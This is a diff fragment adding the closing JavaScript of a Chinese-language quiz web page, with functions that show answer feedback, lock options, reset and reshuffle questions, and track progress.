+        const feedbackArea = document.getElementById(`feedback-${qId}`);
+        const alertBox = document.getElementById(`feedback-alert-${qId}`);
+        const title = document.getElementById(`feedback-title-${qId}`);
+        const reason = document.getElementById(`feedback-reason-${qId}`);
+
+        feedbackArea.style.display = 'block';
+        
+        if (isCorrect) {
+            alertBox.className = 'alert alert-feedback alert-success-custom';
+            title.innerHTML = '<i class="fas fa-check-circle me-2"></i>回答正確！';
+        } else {
+            alertBox.className = 'alert alert-feedback alert-error-custom';
+            title.innerHTML = '<i class="fas fa-times-circle me-2"></i>回答錯誤';
+        }
+        reason.innerHTML = `<strong>判定理由：</strong>${qData.reason}`;
+    }
+
+    function lockOptions(qId) {
+        const options = document.querySelectorAll(`#options-container-${qId} .option-card`);
+        options.forEach(opt => {
+            opt.classList.add('disabled');
+            opt.querySelector('input').disabled = true;
+        });
+    }
+
+    function updateTabStatus(qId, isCorrect) {
+        const icon = document.getElementById(`status-icon-${qId}`);
+        if (isCorrect) {
+            icon.innerHTML = '<i class="fas fa-check text-success"></i>';
+        } else {
+            icon.innerHTML = '<i class="fas fa-times text-danger"></i>';
+        }
+    }
+
+    function resetQuestion(qId) {
+        // Reset State
+        quizState[qId] = { status: 'unanswered', userAnswer: [] };
+        
+        // Reset UI Elements
+        document.getElementById(`feedback-${qId}`).style.display = 'none';
+        document.getElementById(`submit-${qId}`).style.display = 'inline-block';
+        document.getElementById(`submit-${qId}`).disabled = true;
+        document.getElementById(`reset-${qId}`).style.display = 'none';
+        document.getElementById(`status-icon-${qId}`).innerHTML = '';
+
+        // Reshuffle and Re-render Options (Visual Reset)
+        const qData = quizData.questions.find(q => q.id === qId);
+        const container = document.getElementById(`options-container-${qId}`);
+        const shuffledOptions = shuffleArray([...qData.options]);
+        const inputType = qData.type === 'multi' ? 'checkbox' : 'radio';
+
+        container.innerHTML = shuffledOptions.map(opt => `
+            <label class="option-card" id="option-label-${qId}-${opt.id}">
+                <input type="${inputType}" name="q${qId}" class="option-input" value="${opt.id}" onchange="handleOptionSelect(${qId}, '${opt.id}', '${qData.type}')">
+                <span class="option-text">
+                    <span class="fw-bold me-2">(${opt.id})</span>${opt.text}
+                </span>
+            </label>
+        `).join('');
+
+        updateProgress();
+    }
+
+    function updateProgress() {
+        const total = quizData.questions.length;
+        const completed = Object.values(quizState).filter(s => s.status === 'correct').length;
+        const percent = (completed / total) * 100;
+
+        document.getElementById('main-progress').style.width = `${percent}%`;
+        document.getElementById('progress-text').innerText = `已完成 ${completed}/${total}`;
+    }
+</script>
+
+</body>
+</html>
